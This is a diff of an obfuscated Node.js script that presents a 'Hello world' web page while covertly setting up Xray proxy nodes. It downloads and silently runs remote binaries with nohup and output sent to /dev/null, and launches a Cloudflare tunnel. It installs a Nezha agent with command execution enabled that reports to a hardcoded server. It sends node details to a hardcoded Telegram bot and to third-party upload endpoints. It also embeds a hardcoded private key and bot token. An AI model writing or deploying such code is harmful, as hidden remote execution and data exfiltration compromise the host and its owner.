-    '\x20>/dev/null\x202>&1\x20&',
-    'tunnel.yml',
-    'message',
-    'resolve',
-    'BggqhkjOPQMBBw==\x0a',
-    'Failed\x20to\x20get\x20IP\x20address:',
-    'vless-ws-in',
-    'win32',
-    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
-    'close',
-    'match',
-    'proxy',
-    'replace',
-    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
-    'toUpperCase',
-    'update',
-    'now',
-    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
-    '\x5c$&',
-    'org',
-    'https://amd64.ssss.nyc.mn',
-    'private.key',
-    '\x20from\x20backup\x20source',
-    '--tls',
-    'sub.txt',
-    'web\x20running\x20error:\x20',
-    'Unhandled\x20error\x20in\x20startserver:',
-    'config.yaml',
-    'Mozilla/5.0',
-    '-----END\x20EC\x20PARAMETERS-----\x0a',
-    'Failed\x20to\x20send\x20Telegram\x20message:',
-    'post',
-    'aarch64',
-    'existsSync',
-    '800',
-    'fileName',
-    'Telegram\x20message\x20sent\x20successfully',
-    'vmess-ws-in',
-    '/bot',
-    'privateKey',
-    'child_process',
-    '-----BEGIN\x20CERTIFICATE-----\x0a',
-    'inbounds',
-    'text/plain;\x20charset=utf-8',
-    'Retrying\x20',
-    'ARGO_AUTH',
-    'BOT_TOKEN',
-    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
-    '\x20>/dev/null\x202>&1',
-    '/api/add-nodes',
-    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
-    'all',
-    'export',
-    'Unknown',
-    'php\x20running\x20error:\x20',
-    'arm64',
-    'clear',
-    '\x22\x20-out\x20\x22',
-    'finish',
-    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'
-  ]
-  _0x59e5 = function () {
-    return _0x1ced02
-  }
-  return _0x59e5()
+  FALLBACK_CERT =
+    _0x2a1a64(0x1ad) +
+    _0x2a1a64(0x177) +
+    _0x2a1a64(0x1fe) +
+    _0x2a1a64(0x257) +
+    _0x2a1a64(0x178) +
+    _0x2a1a64(0x1fc) +
+    _0x2a1a64(0x16d) +
+    _0x2a1a64(0x1fb) +
+    _0x2a1a64(0x1ec) +
+    _0x2a1a64(0x1d1)
+function ensureTlsCertificates(_0x197e8d, _0x48b839) {
+  const _0x7c2fcb = _0x2a1a64
+  if (fs[_0x7c2fcb(0x201)](_0x197e8d) && fs[_0x7c2fcb(0x201)](_0x48b839)) return
+  fs[_0x7c2fcb(0x1b0)](path[_0x7c2fcb(0x197)](_0x197e8d), { recursive: !![] })
+  try {
+    ;(execSync('openssl\x20version', { stdio: _0x7c2fcb(0x25f) }),
+      execSync(_0x7c2fcb(0x15e) + _0x48b839 + '\x22', { stdio: 'ignore' }),
+      execSync(_0x7c2fcb(0x1ce) + _0x48b839 + _0x7c2fcb(0x20d) + _0x197e8d + _0x7c2fcb(0x1be), { stdio: _0x7c2fcb(0x25f) }))
+    return
+  } catch (_0xbccac0) {}
+  ;(fs['writeFileSync'](_0x48b839, FALLBACK_EC_KEY), fs[_0x7c2fcb(0x16a)](_0x197e8d, FALLBACK_CERT))
 }
-function getCertificateFingerprint(_0x392f59) {
-  const _0x241c33 = _0x3e3e40
+function getCertificateFingerprint(_0x2a8167) {
+  const _0x1c2c3d = _0x2a1a64
   try {
-    const _0x4461ff = execSync('openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22' + _0x392f59 + '\x22', {
-        encoding: _0x241c33(0x1c4),
-        timeout: 0xbb8
-      })[_0x241c33(0x115)](),
-      _0x43de57 = _0x4461ff[_0x241c33(0x153)](/=(.+)$/)
-    if (_0x43de57 && _0x43de57[0x1]) return _0x43de57[0x1][_0x241c33(0x157)]()
-  } catch (_0x3ceb49) {}
+    const _0x59da72 = execSync(_0x1c2c3d(0x247) + _0x2a8167 + '\x22', { encoding: _0x1c2c3d(0x168), timeout: 0xbb8 })[_0x1c2c3d(0x240)](),
+      _0x5c753f = _0x59da72[_0x1c2c3d(0x22c)](/=(.+)$/)
+    if (_0x5c753f && _0x5c753f[0x1]) return _0x5c753f[0x1][_0x1c2c3d(0x1c8)]()
+  } catch (_0x5972d3) {}
   try {
-    const _0x36b2e5 = fs['readFileSync'](_0x392f59, 'utf8'),
-      _0x214e13 = _0x36b2e5['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
-    if (!_0x214e13) return ''
-    const _0x9aa42d = _0x214e13[0x1][_0x241c33(0x155)](/\s/g, ''),
-      _0x42169e = Buffer[_0x241c33(0xdf)](_0x9aa42d, 'base64'),
-      _0x2aee18 = crypto[_0x241c33(0x188)](_0x241c33(0x145))[_0x241c33(0x158)](_0x42169e)[_0x241c33(0x1bc)]('hex')
-    return _0x2aee18[_0x241c33(0x153)](/.{2}/g)[_0x241c33(0x1b9)](':')[_0x241c33(0x157)]()
-  } catch (_0x4e229e) {
-    return (console['error'](_0x241c33(0x194), _0x4e229e), '')
+    const _0x382860 = fs[_0x1c2c3d(0x21e)](_0x2a8167, _0x1c2c3d(0x168)),
+      _0x325117 = _0x382860[_0x1c2c3d(0x22c)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
+    if (!_0x325117) return ''
+    const _0x3c7ade = _0x325117[0x1][_0x1c2c3d(0x173)](/\s/g, ''),
+      _0x98cc8d = Buffer[_0x1c2c3d(0x163)](_0x3c7ade, _0x1c2c3d(0x23e)),
+      _0x10b774 = crypto[_0x1c2c3d(0x147)](_0x1c2c3d(0x25b))['update'](_0x98cc8d)['digest'](_0x1c2c3d(0x143))
+    return _0x10b774[_0x1c2c3d(0x22c)](/.{2}/g)['join'](':')[_0x1c2c3d(0x1c8)]()
+  } catch (_0x92aeea) {
+    return (console['error']('Failed\x20to\x20calculate\x20certificate\x20fingerprint:', _0x92aeea), '')
   }
+}
+function _0x7f7c() {
+  const _0x139c4b = [
+    '.npm',
+    '\x22\x20run',
+    'isp',
+    'blackhole',
+    'test',
+    '/api/delete-nodes',
+    'http://ipv6.ip.sb',
+    'chmodSync',
+    '\x0asocks://',
+    'slice',
+    'config.json',
+    '?security=tls&sni=',
+    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
+    'length',
+    'vless-in',
+    'tcp',
+    '/sendMessage',
+    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
+    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
+    '节点推送**\x0a```',
+    'error',
+    '&pinSHA256=',
+    'Error\x20reading\x20boot.log:',
+    'S5_PORT',
+    'REALITY_PORT',
+    '\x20failed:\x20',
+    'PrivateKey:\x20',
+    'Nodes\x20uploaded\x20successfully',
+    'direct',
+    'ARGO_AUTH',
+    'unlink',
+    'quic',
+    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
+    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
+    '2096',
+    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
+    '\x20in\x20clouudflare',
+    '/trojan-argo',
+    'existsSync',
+    'axios',
+    'base64url',
+    'write',
+    'https://arm64.oooen.com',
+    'subarray',
+    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
+    's5-in',
+    'get',
+    '7214392ylSBzX',
+    'NEZHA_KEY',
+    'resolve',
+    '\x22\x20-out\x20\x22',
+    'https://api.ip.sb/geoip',
+    'SERVER_PORT',
+    'SUB_PATH',
+    '/v1',
+    'https://amd64.ssss.nyc.mn',
+    'php\x20running\x20error:\x20',
+    'key.txt',
+    '/bot',
+    'publicKey',
+    'stringify',
+    'abcdefghijklmnopqrstuvwxyz',
+    'privateKey',
+    'password',
+    '\x20is\x20running',
+    'none',
+    'toString',
+    'readFileSync',
+    'pkill\x20-f\x20\x22[',
+    'config.yaml',
+    'success',
+    'message',
+    'UPLOAD_URL',
+    'charAt',
+    'Not\x20Found',
+    'unlinkSync',
+    'Telegram\x20message\x20sent\x20successfully',
+    'FILE_PATH',
+    'statSync',
+    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
+    '\x0a\x0atrojan://',
+    'match',
+    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
+    'win32',
+    'Download\x20',
+    '2450120XuzZwG',
+    'renameSync',
+    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
+    'child_process',
+    'Error\x20executing\x20command:\x20',
+    'mfa.gov.ua',
+    'pkcs8',
+    'forEach',
+    'reality',
+    'hysteria',
+    'web\x20running\x20error:\x20',
+    '--tls',
+    '3706346MijaJJ',
+    'Unknown',
+    'base64',
+    'HY2_PORT',
+    'trim',
+    '-----END\x20EC\x20PARAMETERS-----\x0a',
+    'application/json',
+    'list.txt',
+    'TunnelSecret',
+    'http',
+    'BggqhkjOPQMBBw==\x0a',
+    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
+    'App\x20is\x20running',
+    'env',
+    'response',
+    '\x20from\x20backup\x20source',
+    '\x20-c\x20',
+    'false',
+    'clear',
+    'substring',
+    'Mozilla/5.0',
+    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
+    'Unhandled\x20error\x20in\x20startserver:',
+    'curl\x20-sm\x203\x20ipv4.ip.sb',
+    'AUTO_ACCESS',
+    '7575949494',
+    'createWriteStream',
+    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
+    'x25519',
+    'https+local://8.8.8.8/dns-query',
+    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
+    'sha256',
+    'readFile',
+    'util',
+    '\x0avless://',
+    'ignore',
+    '/agent',
+    'js-node',
+    'status',
+    'hex',
+    'socks',
+    'nohup\x20\x22',
+    'all',
+    'createHash',
+    'aarch64',
+    'ARGO_PORT',
+    '.download',
+    '3xKNDzy',
+    '443',
+    'utf-8',
+    'floor',
+    'url',
+    '.exe\x20>\x20nul\x202>&1',
+    'https://oooo.serv00.net/add-url',
+    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
+    'string',
+    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
+    '8443',
+    'fileUrls',
+    'join',
+    'fileName',
+    'http://ip-api.com/json',
+    'NEZHA_PORT',
+    'basename',
+    'auto',
+    'PORT',
+    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
+    '/api/add-subscriptions',
+    'www.iij.ad.jp:443',
+    '3520975VycXNe',
+    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
+    'from',
+    'inbounds',
+    '2087',
+    'hysteria-in',
+    '\x0a\x20\x20\x20\x20',
+    'utf8',
+    'pop',
+    'writeFileSync',
+    'org',
+    'Empowerment\x20failed\x20for\x20',
+    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
+    'nezha.933993.xyz:8443',
+    '\x0aPublicKey:\x20',
+    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
+    'www.iij.ad.jp',
+    'freedom',
+    'replace',
+    'Add\x20automatic\x20access\x20task\x20faild:\x20',
+    '\x20>/dev/null\x202>&1\x20&',
+    '1449194zdkEHx',
+    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
+    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
+    'tls',
+    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
+    'true',
+    '/sub.txt\x20saved\x20successfully',
+    'catch',
+    'toLowerCase',
+    '\x0aclient_secret:\x20',
+    '/vmess-argo',
+    '\x20-c\x20\x22',
+    'spki',
+    'split',
+    'Failed\x20to\x20get\x20IP\x20address:',
+    'pipe',
+    'Error\x20downloading\x20files:',
+    'vless',
+    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
+    'log',
+    '180233cd-22c9-4144-a559-012e45986dd6',
+    'del\x20/f\x20/q\x20',
+    'includes',
+    'der',
+    'countryCode',
+    'CFPORT',
+    'unshift',
+    'now',
+    'disable',
+    'NAME',
+    '\x22\x20>\x20/dev/null\x202>&1',
+    '24763mSjoRW',
+    'proxy',
+    'dirname',
+    '\x20>/dev/null\x202>&1',
+    'Skipping\x20adding\x20automatic\x20access\x20task',
+    'text/html;\x20charset=utf-8',
+    'amd',
+    'BOT_TOKEN',
+    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
+    '&path=%2Ftrojan-argo%3Fed%3D2560#',
+    'private.key',
+    'push',
+    'block',
+    'CFIP',
+    'arm',
+    '/web',
+    '127.0.0.1',
+    '3349356dhrHzd',
+    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
+    'export',
+    'tunnel.yml',
+    '2053',
+    'npm\x20running\x20error:\x20',
+    'trojan-ws-in',
+    '-----BEGIN\x20CERTIFICATE-----\x0a',
+    'close',
+    'xtls-rprx-vision',
+    'mkdirSync',
+    'Private\x20Key:',
+    '/api/add-nodes',
+    'map',
+    'http://ipv4.ip.sb',
+    'vmess',
+    'post',
+    'taskkill\x20/f\x20/im\x20',
+    'readdirSync',
+    '\x20successfully',
+    'filter',
+    'vless-tcp-in',
+    'tunnel.json',
+    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
+    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
+    'index.html',
+    'automatic\x20access\x20task\x20added\x20successfully',
+    'country_code',
+    'end',
+    'MarkdownV2',
+    'Public\x20Key:',
+    'boot.log',
+    '/vmess-argo?ed=2560',
+    'http\x20server\x20is\x20running\x20on\x20',
+    'toUpperCase',
+    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
+    'data',
+    'path',
+    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
+    'isFile',
+    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
+    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
+    '/vless-argo',
+    '-----END\x20CERTIFICATE-----\x0a',
+    'PROJECT_URL',
+    '\x20>\x20nul\x202>&1',
+    'vless-fallback-in',
+    '/config.json\x20>/dev/null\x202>&1\x20&',
+    'writeHead',
+    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
+    'text/plain;\x20charset=utf-8',
+    '\x20-s\x20',
+    'deployzy.933993.xyz'
+  ]
+  _0x7f7c = function () {
+    return _0x139c4b
+  }
+  return _0x7f7c()
 }
 async function generateConfig() {
-  const _0x16f6d8 = _0x3e3e40,
-    _0x3e2e0a = {
-      log: { access: _0x16f6d8(0x1d9), error: _0x16f6d8(0x1d9), loglevel: _0x16f6d8(0xdc) },
+  const _0x483542 = _0x2a1a64,
+    _0x8d92e7 = {
+      log: { access: '/dev/null', error: '/dev/null', loglevel: _0x483542(0x21c) },
       inbounds: [
         {
-          tag: 'vless-fallback-in',
+          tag: _0x483542(0x1d4),
           port: ARGO_PORT,
           listen: '::',
-          protocol: _0x16f6d8(0x1dc),
+          protocol: _0x483542(0x187),
           settings: {
-            clients: [{ id: UUID, flow: _0x16f6d8(0x1e5) }],
-            decryption: _0x16f6d8(0xdc),
+            clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
+            decryption: 'none',
             fallbacks: [
               { dest: 0xbb9 },
-              { path: _0x16f6d8(0x19d), dest: 0xbba },
-              { path: _0x16f6d8(0x12a), dest: 0xbbb },
-              { path: _0x16f6d8(0x144), dest: 0xbbc }
+              { path: '/vless-argo', dest: 0xbba },
+              { path: '/vmess-argo', dest: 0xbbb },
+              { path: _0x483542(0x200), dest: 0xbbc }
             ]
           },
-          streamSettings: { network: _0x16f6d8(0x190) }
+          streamSettings: { network: 'tcp' }
         },
         {
-          tag: _0x16f6d8(0xec),
+          tag: _0x483542(0x1bb),
           port: 0xbb9,
-          listen: _0x16f6d8(0x126),
-          protocol: _0x16f6d8(0x1dc),
-          settings: { clients: [{ id: UUID }], decryption: _0x16f6d8(0xdc) },
-          streamSettings: { network: _0x16f6d8(0x190), security: _0x16f6d8(0xdc) }
+          listen: _0x483542(0x1a5),
+          protocol: _0x483542(0x187),
+          settings: { clients: [{ id: UUID }], decryption: 'none' },
+          streamSettings: { network: _0x483542(0x1ea), security: _0x483542(0x21c) }
         },
         {
-          tag: _0x16f6d8(0x14f),
+          tag: 'vless-ws-in',
           port: 0xbba,
-          listen: _0x16f6d8(0x126),
-          protocol: _0x16f6d8(0x1dc),
-          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x16f6d8(0xdc) },
-          streamSettings: { network: 'ws', security: _0x16f6d8(0xdc), wsSettings: { path: _0x16f6d8(0x19d) } },
-          sniffing: { enabled: !![], destOverride: ['http', _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
+          listen: _0x483542(0x1a5),
+          protocol: _0x483542(0x187),
+          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x483542(0x21c) },
+          streamSettings: { network: 'ws', security: _0x483542(0x21c), wsSettings: { path: _0x483542(0x1d0) } },
+          sniffing: { enabled: !![], destOverride: [_0x483542(0x245), _0x483542(0x179), _0x483542(0x1fa)], metadataOnly: ![] }
         },
         {
-          tag: _0x16f6d8(0x16e),
+          tag: 'vmess-ws-in',
           port: 0xbbb,
-          listen: '127.0.0.1',
-          protocol: 'vmess',
+          listen: _0x483542(0x1a5),
+          protocol: _0x483542(0x1b5),
           settings: { clients: [{ id: UUID, alterId: 0x0 }] },
-          streamSettings: { network: 'ws', wsSettings: { path: _0x16f6d8(0x12a) } },
-          sniffing: { enabled: !![], destOverride: [_0x16f6d8(0xfb), _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
+          streamSettings: { network: 'ws', wsSettings: { path: _0x483542(0x180) } },
+          sniffing: { enabled: !![], destOverride: ['http', _0x483542(0x179), 'quic'], metadataOnly: ![] }
         },
         {
-          tag: _0x16f6d8(0x140),
+          tag: _0x483542(0x1ac),
           port: 0xbbc,
-          listen: _0x16f6d8(0x126),
-          protocol: _0x16f6d8(0x18f),
+          listen: _0x483542(0x1a5),
+          protocol: 'trojan',
           settings: { clients: [{ password: UUID }] },
-          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x16f6d8(0x144) } },
-          sniffing: { enabled: !![], destOverride: [_0x16f6d8(0xfb), _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
+          streamSettings: { network: 'ws', security: _0x483542(0x21c), wsSettings: { path: _0x483542(0x200) } },
+          sniffing: { enabled: !![], destOverride: ['http', _0x483542(0x179), _0x483542(0x1fa)], metadataOnly: ![] }
         }
       ],
-      dns: { servers: [_0x16f6d8(0xf9)] },
+      dns: { servers: [_0x483542(0x259)] },
       outbounds: [
-        { protocol: 'freedom', tag: 'direct' },
-        { protocol: _0x16f6d8(0x1a0), tag: 'block' }
+        { protocol: _0x483542(0x172), tag: _0x483542(0x1f7) },
+        { protocol: _0x483542(0x1de), tag: _0x483542(0x1a1) }
       ]
     }
   ;(isValidPort(REALITY_PORT) &&
-    _0x3e2e0a[_0x16f6d8(0x173)]['push']({
-      tag: _0x16f6d8(0x1b3),
+    _0x8d92e7['inbounds'][_0x483542(0x1a0)]({
+      tag: _0x483542(0x1e9),
       listen: '::',
       port: parseInt(REALITY_PORT),
-      protocol: 'vless',
-      settings: { clients: [{ id: UUID, flow: _0x16f6d8(0x1e5) }], decryption: _0x16f6d8(0xdc) },
+      protocol: _0x483542(0x187),
+      settings: { clients: [{ id: UUID, flow: _0x483542(0x1af) }], decryption: _0x483542(0x21c) },
       streamSettings: {
-        network: _0x16f6d8(0x189),
-        security: _0x16f6d8(0x1aa),
-        realitySettings: { show: ![], dest: _0x16f6d8(0x1e2), xver: 0x0, serverNames: ['www.iij.ad.jp'], privateKey: privateKey, shortIds: [''] }
+        network: 'raw',
+        security: _0x483542(0x238),
+        realitySettings: { show: ![], dest: _0x483542(0x160), xver: 0x0, serverNames: [_0x483542(0x171)], privateKey: privateKey, shortIds: [''] }
       }
     }),
     isValidPort(HY2_PORT) &&
-      _0x3e2e0a['inbounds']['push']({
-        tag: _0x16f6d8(0xe1),
+      _0x8d92e7[_0x483542(0x164)][_0x483542(0x1a0)]({
+        tag: _0x483542(0x166),
         listen: '::',
         port: parseInt(HY2_PORT),
-        protocol: _0x16f6d8(0x1cf),
+        protocol: _0x483542(0x239),
         settings: { version: 0x2, clients: [{ auth: UUID }] },
         streamSettings: {
-          network: _0x16f6d8(0x1cf),
-          hysteriaSettings: { version: 0x2, masquerade: { type: _0x16f6d8(0x154), url: 'https://bing.com' } },
-          security: _0x16f6d8(0x1e4),
+          network: _0x483542(0x239),
+          hysteriaSettings: { version: 0x2, masquerade: { type: _0x483542(0x196), url: 'https://bing.com' } },
+          security: _0x483542(0x179),
           tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
         }
       }),
     isValidPort(S5_PORT) &&
-      _0x3e2e0a['inbounds'][_0x16f6d8(0x141)]({
-        tag: 's5-in',
+      _0x8d92e7['inbounds'][_0x483542(0x1a0)]({
+        tag: _0x483542(0x208),
         listen: '::',
         port: parseInt(S5_PORT),
-        protocol: 'socks',
-        settings: { auth: _0x16f6d8(0x187), accounts: [{ user: UUID[_0x16f6d8(0x10a)](0x0, 0x8), pass: UUID['slice'](-0xc) }], udp: !![] }
+        protocol: _0x483542(0x144),
+        settings: { auth: _0x483542(0x21a), accounts: [{ user: UUID[_0x483542(0x24f)](0x0, 0x8), pass: UUID[_0x483542(0x1e4)](-0xc) }], udp: !![] }
       }),
-    fs[_0x16f6d8(0x19c)](path['join'](FILE_PATH, _0x16f6d8(0x128)), JSON[_0x16f6d8(0x109)](_0x3e2e0a, null, 0x2)))
+    fs[_0x483542(0x16a)](path[_0x483542(0x157)](FILE_PATH, _0x483542(0x1e5)), JSON['stringify'](_0x8d92e7, null, 0x2)))
 }
 function getSystemArchitecture() {
-  const _0x3b039b = _0x3e3e40,
-    _0x146b53 = os[_0x3b039b(0xf6)]()
-  return _0x146b53 === _0x3b039b(0x1a5) || _0x146b53 === _0x3b039b(0x180) || _0x146b53 === _0x3b039b(0x169) ? _0x3b039b(0x1a5) : _0x3b039b(0x1ab)
+  const _0x3cf4a0 = _0x2a1a64,
+    _0x516858 = os['arch']()
+  return _0x516858 === _0x3cf4a0(0x1a3) || _0x516858 === 'arm64' || _0x516858 === _0x3cf4a0(0x148) ? _0x3cf4a0(0x1a3) : _0x3cf4a0(0x19b)
 }
-function downloadFile(_0x1388ae, _0x3f2390, _0x3830e6) {
-  const _0x4d6b4d = _0x3e3e40,
-    _0x71180d = _0x1388ae,
-    _0x98a427 = _0x71180d + _0x4d6b4d(0xfa)
-  !fs[_0x4d6b4d(0x16a)](FILE_PATH) && fs['mkdirSync'](FILE_PATH, { recursive: !![] })
-  const _0x314aca = fs[_0x4d6b4d(0x110)](_0x98a427)
-  axios({ method: 'get', url: _0x3f2390, responseType: 'stream' })
-    [_0x4d6b4d(0x13e)]((_0xb03ccf) => {
-      const _0x1bb0d1 = _0x4d6b4d
-      ;(_0xb03ccf['data']['pipe'](_0x314aca),
-        _0x314aca['on'](_0x1bb0d1(0x183), () => {
-          const _0xe5020a = _0x1bb0d1
-          _0x314aca[_0xe5020a(0x152)]((_0x513be4) => {
-            const _0x34dac5 = _0xe5020a
-            if (_0x513be4) {
-              const _0x459379 = _0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + _0x34dac5(0x112) + _0x513be4['message']
-              ;(fs[_0x34dac5(0x1b1)](_0x98a427, () => {}), console[_0x34dac5(0xd1)](_0x459379), _0x3830e6(_0x459379))
+function downloadFile(_0x506b99, _0x365b2c, _0x745aac) {
+  const _0xd32148 = _0x2a1a64,
+    _0xa7c524 = _0x506b99,
+    _0xe0f06 = _0xa7c524 + _0xd32148(0x14a)
+  !fs[_0xd32148(0x201)](FILE_PATH) && fs[_0xd32148(0x1b0)](FILE_PATH, { recursive: !![] })
+  const _0x5d42dc = fs[_0xd32148(0x256)](_0xe0f06)
+  axios({ method: _0xd32148(0x209), url: _0x365b2c, responseType: 'stream' })
+    ['then']((_0x5bb066) => {
+      const _0x50c51c = _0xd32148
+      ;(_0x5bb066[_0x50c51c(0x1ca)][_0x50c51c(0x185)](_0x5d42dc),
+        _0x5d42dc['on']('finish', () => {
+          const _0x3b02af = _0x50c51c
+          _0x5d42dc[_0x3b02af(0x1ae)]((_0x19ff05) => {
+            const _0x2770d6 = _0x3b02af
+            if (_0x19ff05) {
+              const _0x35be8a = _0x2770d6(0x22f) + path['basename'](_0xa7c524) + _0x2770d6(0x1f4) + _0x19ff05[_0x2770d6(0x222)]
+              ;(fs[_0x2770d6(0x1f9)](_0xe0f06, () => {}), console[_0x2770d6(0x1ef)](_0x35be8a), _0x745aac(_0x35be8a))
               return
             }
             try {
-              fs[_0x34dac5(0x139)](_0x98a427, _0x71180d)
-            } catch (_0x236a17) {
-              const _0x444c37 = _0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + '\x20failed:\x20' + _0x236a17[_0x34dac5(0x14b)]
-              ;(fs[_0x34dac5(0x1b1)](_0x98a427, () => {}), console['error'](_0x444c37), _0x3830e6(_0x444c37))
+              fs[_0x2770d6(0x231)](_0xe0f06, _0xa7c524)
+            } catch (_0x2307c5) {
+              const _0x619afe = _0x2770d6(0x22f) + path[_0x2770d6(0x15b)](_0xa7c524) + _0x2770d6(0x1f4) + _0x2307c5[_0x2770d6(0x222)]
+              ;(fs[_0x2770d6(0x1f9)](_0xe0f06, () => {}), console[_0x2770d6(0x1ef)](_0x619afe), _0x745aac(_0x619afe))
               return
             }
-            ;(console['log'](_0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + '\x20successfully'), _0x3830e6(null, _0x71180d))
+            ;(console[_0x2770d6(0x189)](_0x2770d6(0x22f) + path[_0x2770d6(0x15b)](_0xa7c524) + _0x2770d6(0x1b9)), _0x745aac(null, _0xa7c524))
           })
         }),
-        _0x314aca['on'](_0x1bb0d1(0xd1), (_0x32f5db) => {
-          const _0x53c06c = _0x1bb0d1
-          fs[_0x53c06c(0x1b1)](_0x98a427, () => {})
-          const _0xdc43b0 = _0x53c06c(0x122) + path[_0x53c06c(0x1b2)](_0x71180d) + _0x53c06c(0x112) + _0x32f5db[_0x53c06c(0x14b)]
-          ;(console[_0x53c06c(0xd1)](_0xdc43b0), _0x3830e6(_0xdc43b0))
+        _0x5d42dc['on'](_0x50c51c(0x1ef), (_0xedf1d5) => {
+          const _0x261a9b = _0x50c51c
+          fs[_0x261a9b(0x1f9)](_0xe0f06, () => {})
+          const _0x180ccb = _0x261a9b(0x22f) + path[_0x261a9b(0x15b)](_0xa7c524) + _0x261a9b(0x1f4) + _0xedf1d5['message']
+          ;(console[_0x261a9b(0x1ef)](_0x180ccb), _0x745aac(_0x180ccb))
         }))
     })
-    ['catch']((_0x1de6b4) => {
-      const _0x1851fb = _0x4d6b4d
-      fs['unlink'](_0x98a427, () => {})
-      const _0x260943 = 'Download\x20' + path[_0x1851fb(0x1b2)](_0x71180d) + _0x1851fb(0x112) + _0x1de6b4[_0x1851fb(0x14b)]
-      ;(console[_0x1851fb(0xd1)](_0x260943), _0x3830e6(_0x260943))
+    ['catch']((_0x4404cc) => {
+      const _0x1409cc = _0xd32148
+      fs[_0x1409cc(0x1f9)](_0xe0f06, () => {})
+      const _0x56297e = _0x1409cc(0x22f) + path[_0x1409cc(0x15b)](_0xa7c524) + _0x1409cc(0x1f4) + _0x4404cc[_0x1409cc(0x222)]
+      ;(console['error'](_0x56297e), _0x745aac(_0x56297e))
     })
 }
 async function downloadFilesAndRun() {
-  const _0x3cf65e = _0x3e3e40,
-    _0x5304c3 = getSystemArchitecture(),
-    _0x11b60e = getFilesForArchitecture(_0x5304c3)
-  if (_0x11b60e['length'] === 0x0) {
-    console[_0x3cf65e(0x12d)](_0x3cf65e(0x116))
+  const _0x57e4a6 = _0x2a1a64,
+    _0x5c1906 = getSystemArchitecture(),
+    _0x3924d1 = getFilesForArchitecture(_0x5c1906)
+  if (_0x3924d1[_0x57e4a6(0x1e8)] === 0x0) {
